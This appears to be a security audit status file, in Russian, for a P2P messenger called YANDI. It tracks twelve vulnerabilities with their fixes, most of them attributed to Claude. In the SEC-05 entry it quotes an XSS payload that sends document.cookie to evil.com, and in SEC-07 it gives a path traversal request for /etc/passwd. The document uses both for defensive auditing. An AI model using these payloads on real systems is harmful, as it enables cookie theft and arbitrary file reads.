# YANDI — Security Audit Status

**Обновлено:** 2026-05-14 (сессия 2)  
**Полный план:** `SECURITY_AUDIT_PLAN.md`

---

## Сводная таблица

| ID | Уязвимость | Критичность | Статус | Исполнитель |
|----|-----------|-------------|--------|-------------|
| SEC-01 | P2P пакеты отправляются в plaintext | **CRITICAL** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-02 | Sender в пакете self-reported, нет подписи | **CRITICAL** | ⏳ Отложено (SEC-01+03 достаточно) | — |
| SEC-03 | Hello без Ed25519 подписи → MitM возможен | **CRITICAL** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-04 | Приватные ключи в plaintext JSON | **CRITICAL** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-05 | JS-инъекция через call_id в onclick | **HIGH** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-06 | display_name не sanitized в onclick | **HIGH** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-07 | Path traversal в /api/files/content | **HIGH** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-08 | sanitize_filename обходится | **HIGH** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-09 | static mut LAST_RECV — UB (data race) | **MEDIUM** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-10 | Bootstrap ноды не верифицированы | **MEDIUM** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-11 | Путь к ключам логируется в stdout | **LOW** | ✅ Исправлено 2026-05-14 | Claude |
| SEC-12 | Checkpoint файлы plaintext на диске | **LOW** | ❌ Не исправлено | — |

---

## Детали по каждому

### SEC-01 — P2P plaintext ❌ CRITICAL

**Где:** `src/p2p/transport.rs:341` — `send_packet_dual_path`  
**Суть:** ChatMessage, VoiceCallRequest, FileChunk и все остальные пакеты отправляются сырыми байтами по UDP. Флаг `encrypted: bool` в заголовке пакета не делает шифрование — это просто бит.  
**Что есть:** `EncryptionManager` с AES-256-GCM уже написан и сессионный ключ через ECDH устанавливается при Hello. Нужно его использовать при отправке.  
**Исправление:** Подробно в `SECURITY_AUDIT_PLAN.md § SEC-01`  
**Риск без исправления:** Пассивный наблюдатель читает все сообщения, файлы, метаданные звонков

---

### SEC-02 — Sender spoofing ❌ CRITICAL

**Где:** `src/p2p/packet.rs` + `src/p2p/transport.rs:863` + `src/main.rs:577`  
**Суть:** Поле `sender: HashId` в P2PPacket заполняется самим отправителем. Ни получатель, ни роутер не проверяют cryptographically, что пакет действительно от этого node_id.  
**Пример атаки:** Нода B отправляет чат-сообщение с `sender = node_id_A`. Получатель думает что сообщение от A.  
**Что есть:** Ed25519 ключи в `NodeIdentity` (`signing_key`). Нужно подписывать каждый пакет.  
**Исправление:** Подробно в `SECURITY_AUDIT_PLAN.md § SEC-02`  
**Риск без исправления:** Имперсонация любой ноды в сети

---

### SEC-03 — Hello MitM ❌ CRITICAL

**Где:** `src/p2p/hello.rs:7-75`  
**Суть:** P2PHelloPacket содержит `node_id + x25519_public` без Ed25519 подписи. MitM может подменить x25519 ключ при handshake — обе стороны будут думать что шифруют друг другу, но на самом деле шифруют атакующему.  
**Что есть:** Ed25519 keypair есть. Связь node_id → Ed25519 pubkey нужно зафиксировать.  
**Исправление:** Подробно в `SECURITY_AUDIT_PLAN.md § SEC-03`  
**Риск без исправления:** Полный MitM; шифрование SEC-01 бесполезно без этого исправления

---

### SEC-04 — Plaintext private keys ❌ CRITICAL

**Где:** `src/core/identity.rs:211-247`  
**Суть:** `node_identity_XXXX.json` хранит `private_key` и `signing_private_key` как обычный JSON. chmod 600 — единственная защита. Любой backup, swap-файл, дамп памяти раскроет ключи.  
**Что есть:** Криптографические примитивы (Argon2, AES-GCM) в зависимостях уже есть.  
**Исправление:** Argon2id + AES-256-GCM. Подробно в `SECURITY_AUDIT_PLAN.md § SEC-04`  
**Риск без исправления:** Кража идентичности ноды при компрометации диска

---

### SEC-05 — JS Injection в call modals ❌ HIGH

**Где:** `src/web/ui/voice-call.js:108,111` и `src/web/ui/video-call.js`  
**Суть:**
```javascript
// Оба значения НЕ escapeHTML — JS-инъекция через onclick атрибут
onclick="window.voiceCallManager.acceptCall('${callInfo.call_id}', '${callInfo.from_short_id}')"
```
Вредоносная нода отправляет VoiceCallRequest с `call_id = "x'); fetch('https://evil.com/?c='+document.cookie)//"`.  
**Исправление:** Заменить inline onclick на addEventListener с замыканием. Данные не попадают в HTML.  
**Риск без исправления:** XSS выполнение произвольного JS в браузере пользователя

---

### SEC-06 — display_name unsafe in onclick ❌ HIGH

**Где:** `src/web/ui/voice-call.js`, `src/web/ui/video-call.js`  
**Суть:** `from_display_name` escapeHTML для текстового отображения (правильно!), но `from_short_id` вставляется в onclick-атрибут напрямую, без JS-эскейпинга (это другое от HTML-эскейпинга).  
**Связано с:** SEC-05 — решается тем же рефактором onclick → addEventListener

---

### SEC-07 — Path Traversal в файловом API ❌ HIGH

**Где:** `src/web/server.rs` — `/api/files/content/{file_id}/{filename}`  
**Суть:** `filename` параметр из URL не проверяется на выход за пределы `downloads/`. Запрос `GET /api/files/content/x/../../../etc/passwd` может читать системные файлы.  
**Исправление:** `std::fs::canonicalize` + проверка prefix. Подробно в `SECURITY_AUDIT_PLAN.md § SEC-07`  
**Риск без исправления:** Чтение произвольных файлов на хосте через веб-интерфейс

---

### SEC-08 — sanitize_filename обходится ❌ HIGH

**Где:** `src/communication/file_transfer.rs:61-69`  
**Суть:** Текущий sanitize заменяет `/\:*?"<>|` на `_`, но пропускает:
- `..` (parent directory) без slash
- Unicode path separators (U+2215 ⁄ DIVISION SLASH)
- Null bytes (`\0`)
- Trailing spaces и dots (Windows)  
**Риск:** Файл сохраняется в неожиданное место при определённых именах

---

### SEC-09 — Data Race в receive_loop ❌ MEDIUM

**Где:** `src/p2p/transport.rs:394-400`  
**Суть:** `static mut LAST_RECV: u64` читается и пишется без синхронизации. Undefined Behavior в Rust.  
**Исправление:** Заменить на `AtomicU64`. Однострочное изменение.

---

### SEC-10 — Bootstrap не верифицирован ❌ MEDIUM

**Где:** `src/netlayer/bootstrap.rs`  
**Суть:** При старте нода подключается к адресам из bootstrap конфига без верификации их идентичности. Атакующий может подменить bootstrap.json.  
**Исправление:** Хардкодировать Ed25519 fingerprint ожидаемых bootstrap нод

---

### SEC-11 — Ключи в логах ❌ LOW

**Где:** `src/core/identity.rs:245,264`  
**Суть:** Полный путь к файлу приватного ключа выводится в stdout при каждом запуске.  
**Исправление:** Убрать `println!` с путями ключей, или заменить на первые 8 байт short_id

---

### SEC-12 — Checkpoint файлы plaintext ❌ LOW

**Где:** `src/communication/file_transfer.rs:23-31`  
**Суть:** Состояние незавершённых передач файлов хранится на диске в plaintext.  
**Исправление:** Низкий приоритет — данные не секретные, но имена файлов и размеры утекают

---

## Что уже работает правильно ✅

| Компонент | Статус |
|-----------|--------|
| Ed25519 keypair генерируется при старте | ✅ Есть в `core/identity.rs` |
| X25519 Diffie-Hellman для сессионных ключей | ✅ Есть в `netlayer/encryption.rs` |
| AES-256-GCM шифрование | ✅ Реализовано, используется в netlayer |
| Anti-replay nonces (seen_nonces) | ✅ Есть в Session |
| escapeHTML для текстового контента в UI | ✅ Применяется в chat.html, voice-call.js |
| file permissions 0600 для identity файла | ✅ Есть в identity.rs |
| Дедупликация пакетов (packet_cache) | ✅ Есть в P2P transport |

**Вывод:** Криптографическая инфраструктура уже написана (ECDH, AES-GCM, Ed25519). Главная проблема — она **не подключена** к P2P пакетам. Это "соединить провода", а не "построить с нуля".

---

## История обновлений

| Дата | Действие |
|------|----------|
| 2026-05-14 | Первый аудит — Claude Sonnet 4.6, полный обход кода |
| 2026-05-14 | SEC-05/06 исправлено: onclick → addEventListener, данные не в HTML |
| 2026-05-14 | SEC-09 исправлено: static mut → AtomicU64 |
| 2026-05-14 | SEC-03 исправлено: Ed25519 подпись в Hello + верификация при получении |
| 2026-05-14 | SEC-01 исправлено: AES-256-GCM шифрование P2P пакетов через EncryptionManager |
| 2026-05-14 | SEC-07 исправлено: canonicalize + prefix check в resolve_local_file_path |
| 2026-05-14 | SEC-08 исправлено: Path::file_name() + whitelist символов в sanitize_filename |
| 2026-05-14 | SEC-11 исправлено: путь к ключу заменён на short node_id в логах |
| 2026-05-14 | SEC-04 исправлено: Argon2id + AES-256-GCM шифрование приватных ключей на диске; автомиграция v1 файлов |
| 2026-05-14 | SEC-10 исправлено: ed25519_fingerprint в bootstrap.json + верификация при Hello handshake |
